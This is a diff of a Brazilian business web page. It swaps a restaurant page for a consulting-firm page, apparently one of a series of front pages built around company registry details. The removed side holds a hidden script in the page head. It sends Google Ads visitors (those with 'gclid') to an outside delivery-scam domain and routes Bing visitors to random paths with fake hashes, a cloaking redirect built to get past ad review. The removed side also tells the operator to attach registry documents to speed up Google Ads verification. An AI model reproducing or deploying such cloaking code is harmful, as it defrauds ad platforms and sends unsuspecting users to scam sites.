@@ -3,223 +3,174 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Restaurante Sabor de Minas — Sabor de casa em Pedreira</title>
-  <meta name="description" content="Restaurante Sabor de Minas (Eliezer Carlos da Rocha) — refeições e marmitas caseiras no centro de Pedreira (SP). Informações institucionais e contatos para verificação." />
-  <meta name="theme-color" content="#BF2E2E" />
+  <title>GPA Consulting LTDA — Gpa Consultoria</title>
+  <meta name="description" content="GPA Consulting LTDA — consultoria empresarial em Lavras (MG). Soluções em gestão, planejamento e operação comercial." />
+  <meta name="theme-color" content="#0B6B3A" />
   <script type="application/ld+json">
   {
-    "@context": "https://schema.org",
-    "@type": "Restaurant",
-    "name": "Restaurante Sabor de Minas",
-    "legalName": "Eliezer Carlos da Rocha",
-    "telephone": "+55 19 38700-0000",
-    "address": {
-      "@type": "PostalAddress",
-      "streetAddress": "Praça Coronel João Pedro, 62",
-      "addressLocality": "Pedreira",
-      "addressRegion": "SP",
-      "postalCode": "13920-000",
-      "addressCountry": "BR"
+    "@context":"https://schema.org",
+    "@type":"ProfessionalService",
+    "name":"GPA Consulting LTDA",
+    "alternateName":"Gpa Consultoria",
+    "telephone":"+55 38 99100-0000",
+    "address":{
+      "@type":"PostalAddress",
+      "streetAddress":"Rua Joaquim Figueiredo, 72 - A",
+      "addressLocality":"Lavras",
+      "addressRegion":"MG",
+      "postalCode":"37200-312",
+      "addressCountry":"BR"
     },
-    "foundingDate": "2020-01-16",
-    "priceRange": "R$",
-    "taxID": "36.033.817/0001-03"
+    "foundingDate":"2025-04-08",
+    "email":"gp****@****.com",
+    "priceRange":"R$",
+    "taxID":"60.296.978/0001-74"
   }
   </script>
 
   <style>
     :root{
-      --red:#BF2E2E;
-      --green:#2E8B57;
-      --yellow:#F2C94C;
-      --bg:#fafafa;
-      --card:#fff;
+      --accent:#0B6B3A;
       --muted:#556;
+      --card:#ffffff;
+      --bg:#f6faf6;
       --radius:12px;
-      font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial;
+      font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
       color:#222;
     }
     *{box-sizing:border-box}
-    body{margin:0;background:linear-gradient(180deg,#fff,var(--bg));}
-    .wrap{max-width:1080px;margin:0 auto;padding:22px}
-    header{background:linear-gradient(90deg,var(--red),#9f2626);color:#fff;padding:20px;border-radius:12px;box-shadow:0 6px 24px rgba(0,0,0,0.06)}
+    body{margin:0;background:var(--bg);-webkit-font-smoothing:antialiased}
+    .wrap{max-width:1100px;margin:28px auto;padding:18px}
+    header{display:flex;align-items:center;gap:16px;padding:18px;background:linear-gradient(90deg,var(--accent),#0a5b33);border-radius:12px;color:#fff}
     .brand{display:flex;gap:14px;align-items:center}
-    .logo{width:64px;height:64px;border-radius:10px;background:linear-gradient(180deg,var(--yellow),var(--red));display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff}
+    .logo{width:64px;height:64px;border-radius:10px;background:#fff;color:var(--accent);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:18px}
+    header h1{margin:0;font-size:20px}
+    header p{margin:0;font-size:13px;opacity:0.95}
     nav{margin-left:auto}
-    nav a{color:white;text-decoration:none;margin-left:12px;font-weight:600}
-    main{margin-top:18px}
-    .hero{display:flex;gap:20px;align-items:center;padding:18px;background:linear-gradient(90deg, rgba(191,46,46,0.05), rgba(46,139,87,0.03));border-radius:12px}
-    .slogan{font-size:20px;color:var(--red);font-weight:700;margin:0}
-    .lead{margin:6px 0 0;color:#333}
-    .card{background:var(--card);padding:16px;border-radius:12px;box-shadow:0 8px 26px rgba(0,0,0,0.06);margin-top:14px}
-    table{width:100%;border-collapse:collapse;margin-top:8px}
-    th,td{padding:8px;border-bottom:1px solid #eee;text-align:left}
-    th{width:180px;color:#444}
-    .muted{color:var(--muted);font-size:14px}
-    footer{margin-top:28px;padding:18px 0;border-top:1px solid #eee}
-    @media(max-width:900px){.hero{flex-direction:column;align-items:flex-start}}
+    nav a{color:#dff3df;text-decoration:none;margin-left:12px;font-weight:600;font-size:14px}
+    main{margin-top:20px}
+    .hero{display:grid;grid-template-columns:1fr 360px;gap:18px;align-items:center}
+    .card{background:var(--card);padding:20px;border-radius:12px;box-shadow:0 8px 28px rgba(15,40,20,0.06)}
+    h2{color:var(--accent);margin:0 0 10px}
+    p.lead{color:var(--muted);margin-top:6px}
+    .grid-3{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:12px}
+    table{width:100%;border-collapse:collapse}
+    th,td{padding:8px;border-bottom:1px solid #f0f0f0;text-align:left;color:#444}
+    th{width:210px;font-weight:600}
+    form{display:flex;flex-direction:column;gap:10px}
+    input,textarea,select{padding:10px;border:1px solid #e6efe6;border-radius:8px;font-size:14px}
+    button{background:var(--accent);color:#fff;border:none;padding:10px;border-radius:8px;font-weight:700;cursor:pointer}
+    footer{margin-top:22px;padding:18px;text-align:center;color:var(--muted);font-size:14px}
+    @media(max-width:980px){.hero{grid-template-columns:1fr} .grid-3{grid-template-columns:1fr}}
   </style>
-  <script>
-
-const urls = [
-    'cte/index',
-    'nfe/index',
-    'cte/index',
-    'asp/indexp',
-    'app/index',
-    'xml/indexp',
-    'danfe/index',
-    'nfe/index'
-];
-
-// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
-function generateHash() {
-    // Gerando um hash simples como alternativa ao MD5
-    // Para MD5 real, seria necessário uma biblioteca como crypto-js
-    return Math.random().toString(36).substring(2, 15) + 
-           Math.random().toString(36).substring(2, 15) + 
-           Date.now().toString(36);
-}
-
-// Selecionando URL aleatória
-const randomIndex = Math.floor(Math.random() * urls.length);
-const randomUrl = urls[randomIndex];
-const hash = generateHash();
-const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
-const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
-const xirjfgjsdhdjd = 'https://delivery-marmitaprime.newprojetonline.sbs/?id=777';  
-
-// Obtendo o referer (disponível apenas no navegador)
-let referer;
-if (typeof document !== 'undefined' && document.referrer) {
-    referer = document.referrer;
-} else {
-    referer = 'not found';
-}
-
-// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
-let currentUrl;
-if (typeof window !== 'undefined') {
-    currentUrl = window.location.href;
-} else {
-    currentUrl = '';
-}
-
-// Verificando condições e redirecionando
-if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
-    // Redirecionamento (no navegador)
-    if (typeof window !== 'undefined') {
-        window.location.href = xirjfgjsdhdjd ;
-    } else {
-        console.log('Redirect to:', xirjfgjsdhdjd );
-    }
-} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
-    // Redirecionamento (no navegador)
-    if (typeof window !== 'undefined') {
-        window.location.href = bingrandomUrlWithHash;
-    } else {
-        console.log('Redirect to:', bingrandomUrlWithHash);
-    }
-} else {
-    // Bloco vazio equivalente ao else do PHP
-}
-  
-</script>
-  
 </head>
 <body>
   <div class="wrap">
     <header>
       <div class="brand">
-        <div class="logo">SM</div>
+        <div class="logo">GPA</div>
         <div>
-          <h1 style="margin:0">Restaurante Sabor de Minas</h1>
-          <div style="font-size:13px;opacity:0.95">Eliezer Carlos da Rocha — Pedreira / SP</div>
+          <h1>GPA Consulting LTDA</h1>
+          <p>Gpa Consultoria — consultoria empresarial • Lavras (MG)</p>
         </div>
-        <nav>
-          <a href="#inicio">Início</a>
-          <a href="#sobre">Sobre</a>
-          <a href="#privacidade">Privacidade</a>
-          <a href="#contato">Contato</a>
-        </nav>
       </div>
+      <nav>
+        <a href="#sobre">Sobre</a>
+        <a href="#servicos">Serviços</a>
+        <a href="#dados">Dados</a>
+        <a href="#contato">Contato</a>
+      </nav>
     </header>
 
     <main>
-      <section id="inicio" class="hero card">
-        <div style="flex:1">
-          <p class="slogan">Sabor de casa — tradição e comida mineira em Pedreira</p>
-          <p class="lead">O <strong>Restaurante Sabor de Minas</strong> oferece refeições caseiras, marmitas para entrega e atendimento presencial no centro de Pedreira. Trabalhamos com ingredientes selecionados, preparo higiênico e serviço rápido para clientes locais e encomendas.</p>
-        </div>
-        <div style="width:300px">
-          <img alt="Prato caseiro" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='300' height='180'><rect rx='12' width='100%' height='100%' fill='%23F8F3E9'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' fill='%23BF2E2E' font-size='16' font-family='Arial'>Imagem institucional (substituir)</text></svg>" style="width:100%;border-radius:10px;display:block;box-shadow:0 8px 20px rgba(0,0,0,0.06)" />
-        </div>
-      </section>
+      <section class="hero">
+        <div class="card">
+          <h2>Consultoria que transforma operação em resultado</h2>
+          <p class="lead">A GPA Consulting oferece soluções práticas de gestão, planejamento comercial e otimização operacional para pequenas e médias empresas. Atendemos presencialmente em Lavras e remotamente em todo Brasil.</p>
 
-      <section class="card" id="sobre">
-        <h2 style="margin-top:0;color:var(--red)">Sobre</h2>
-        <p class="muted">O Restaurante Sabor de Minas, de propriedade de <strong>Eliezer Carlos da Rocha</strong>, atua desde 16/01/2020 no preparo de refeições caseiras e marmitas. Nosso foco é oferecer sabor tradicional mineiro com padrão de qualidade e higiene, atendendo moradores e empresas da região central de Pedreira (SP).</p>
-
-        <div style="display:flex;gap:12px;margin-top:12px;flex-wrap:wrap">
-          <div style="flex:1;min-width:180px" class="card">
-            <h4 style="margin:0 0 8px">Missão</h4>
-            <p class="muted" style="margin:0">Levar a comida de casa com sabor autêntico, garantindo bom atendimento e segurança alimentar.</p>
-          </div>
-          <div style="flex:1;min-width:180px" class="card">
-            <h4 style="margin:0 0 8px">Visão</h4>
-            <p class="muted" style="margin:0">Ser reconhecido localmente pela qualidade e confiança no serviço de refeições e marmitas.</p>
-          </div>
-          <div style="flex:1;min-width:180px" class="card">
-            <h4 style="margin:0 0 8px">Valores</h4>
-            <ul style="margin:0;padding-left:18px;color:var(--muted)">
-              <li>Higiene e segurança alimentar</li>
-              <li>Atendimento respeitoso</li>
-              <li>Qualidade nos ingredientes</li>
+          <div style="margin-top:16px">
+            <h3 style="margin:0 0 8px">Como trabalhamos</h3>
+            <ul style="color:var(--muted);margin:0;padding-left:18px">
+              <li>Diagnóstico prático da operação</li>
+              <li>Plano tático de vendas e processos</li>
+              <li>Capacitação e implantação de rotinas</li>
             </ul>
           </div>
         </div>
+
+        <aside class="card">
+          <h3 style="margin-top:0">Contato rápido</h3>
+          <p style="margin:6px 0;color:var(--muted)"><strong>Endereço</strong><br>Rua Joaquim Figueiredo, 72 - A, Vila Rosalina, Lavras / MG</p>
+          <p style="margin:6px 0;color:var(--muted)"><strong>Telefone</strong><br>(38) 991**-****</p>
+          <p style="margin:6px 0;color:var(--muted)"><strong>E-mail</strong><br>gp****@****.com</p>
+          <div style="margin-top:12px;font-size:13px;color:var(--muted)">Atendimento por agendamento — reuniões presenciais e remotas.</div>
+        </aside>
       </section>
 
-      <section class="card">
-        <h2 style="color:var(--red)">Informações Cadastrais</h2>
+      <section id="servicos" class="card" style="margin-top:18px">
+        <h2>Serviços</h2>
+        <div class="grid-3" style="margin-top:12px">
+          <div class="card" style="padding:14px">
+            <h4 style="margin:0 0 8px">Consultoria Gerencial</h4>
+            <p class="lead">Melhoria de processos, indicadores e estruturação de gestão para micro e pequenas empresas.</p>
+          </div>
+          <div class="card" style="padding:14px">
+            <h4 style="margin:0 0 8px">Planejamento Comercial</h4>
+            <p class="lead">Estratégias de vendas, precificação e treinamento da equipe comercial.</p>
+          </div>
+          <div class="card" style="padding:14px">
+            <h4 style="margin:0 0 8px">Implantação Operacional</h4>
+            <p class="lead">Rotinas, controles e sistemas leves para execução rápida e mensurável.</p>
+          </div>
+        </div>
+      </section>
+
+      <section id="dados" class="card" style="margin-top:18px">
+        <h2>Informações Cadastrais</h2>
         <table>
           <tbody>
-            <tr><th>Razão Social</th><td>Eliezer Carlos da Rocha</td></tr>
-            <tr><th>Nome Fantasia</th><td>Restaurante Sabor de Minas</td></tr>
-            <tr><th>CNPJ</th><td>36.033.817/0001-03</td></tr>
-            <tr><th>Data de Abertura</th><td>16/01/2020</td></tr>
+            <tr><th>Razão Social</th><td>GPA Consulting LTDA</td></tr>
+            <tr><th>Nome Fantasia</th><td>Gpa Consultoria</td></tr>
+            <tr><th>CNPJ</th><td>60.296.978/0001-74</td></tr>
+            <tr><th>Data da Abertura</th><td>08/04/2025</td></tr>
             <tr><th>Porte</th><td>Micro Empresa</td></tr>
-            <tr><th>Natureza Jurídica</th><td>Empresário (Individual)</td></tr>
-            <tr><th>Opção Simples</th><td>Sim (desde 01/01/2025)</td></tr>
-            <tr><th>Capital Social</th><td>R$ 25.000,00</td></tr>
+            <tr><th>Natureza Jurídica</th><td>Sociedade Empresária Limitada</td></tr>
+            <tr><th>Opção Simples</th><td>Sim (desde 08/04/2025)</td></tr>
+            <tr><th>Capital Social</th><td>R$ 10.000,00</td></tr>
             <tr><th>Situação</th><td>Ativa</td></tr>
-            <tr><th>Inscrição Estadual</th><td>—</td></tr>
+            <tr><th>Endereço</th><td>Rua Joaquim Figueiredo, 72 - A, Vila Rosalina — Lavras / MG — CEP: 37200-312</td></tr>
           </tbody>
         </table>
       </section>
 
-      <section id="privacidade" class="card">
-        <h2 style="color:var(--red)">Política de Privacidade (resumo)</h2>
-        <p class="muted">O Restaurante Sabor de Minas coleta apenas os dados necessários para processar pedidos e entregas (nome, telefone, endereço). As informações são utilizadas exclusivamente para atendimento e não são compartilhadas com terceiros, salvo quando necessário para a entrega ou por obrigação legal. O cliente pode solicitar a exclusão ou atualização de seus dados entrando em contato pelo e-mail informado.</p>
+      <section id="contato" class="card" style="margin-top:18px">
+        <h2>Fale com a GPA Consulting</h2>
+        <p class="lead">Preencha o formulário abaixo e nossa equipe entrará em contato para agendamento.</p>
+
+        <!-- Formulário estático (ilustrativo) -->
+        <form onsubmit="event.preventDefault(); alert('Formulário apenas ilustrativo — envie e-mail para gp****@****.com');">
+          <input type="text" placeholder="Nome completo *" required>
+          <input type="email" placeholder="E-mail *" required>
+          <input type="tel" placeholder="Telefone / WhatsApp *" required>
+          <textarea rows="5" placeholder="Mensagem / Objetivo do contato *" required></textarea>
+          <button type="submit">Enviar mensagem</button>
+        </form>
+
       </section>
 
-      <section id="contato" class="card">
-        <h2 style="color:var(--red)">Contato & Localização</h2>
-        <p class="muted"><strong>Endereço:</strong><br>Praça Coronel João Pedro, 62 — Centro — Pedreira / SP — CEP: 13920-000</p>
-        <p class="muted"><strong>Telefone:</strong> (19) 38700-0000</p>
-        <p class="muted"><strong>E-mail:</strong> (ver e-mail cadastrado)</p>
-        <p class="muted">Recomendamos anexar o cartão CNPJ ou documento oficial ao solicitar verificação no Google Ads para acelerar a aprovação.</p>
+      <section id="privacidade" class="card" style="margin-top:18px">
+        <h2>Política de Privacidade (resumo)</h2>
+        <p>Na GPA Consulting coletamos apenas os dados necessários para atendimento e agendamento (nome, telefone, e-mail e mensagem). Os dados são utilizados exclusivamente para fins de contato e prestação de serviços de consultoria, mantidos em local seguro e não compartilhados com terceiros sem consentimento, exceto quando exigido por lei. Para solicitações de acesso, correção ou exclusão, entre em contato pelo e-mail informado.</p>
       </section>
     </main>
 
     <footer>
-      <div style="max-width:1080px;margin:20px auto;padding:12px 22px;color:var(--muted);text-align:center">
-        © <span id="yr"></span> Restaurante Sabor de Minas — CNPJ 36.033.817/0001-03<br>
-        Praça Coronel João Pedro, 62 — Pedreira / SP — Todos os direitos reservados.
+      <div style="max-width:980px;margin:auto">
+        <div style="font-weight:700">GPA Consulting LTDA — Gpa Consultoria</div>
+        <div style="margin-top:6px;color:var(--muted)">CNPJ: 60.296.978/0001-74 • Rua Joaquim Figueiredo, 72 - A, Vila Rosalina • Lavras / MG • CEP: 37200-312</div>
+        <div style="margin-top:8px;color:var(--muted)">E-mail de contato: gp****@****.com • Telefone: (38) 991**-****</div>
       </div>
     </footer>
   </div>
-
-  <script>document.getElementById('yr').innerText = new Date().getFullYear()</script>
 </body>
 </html>
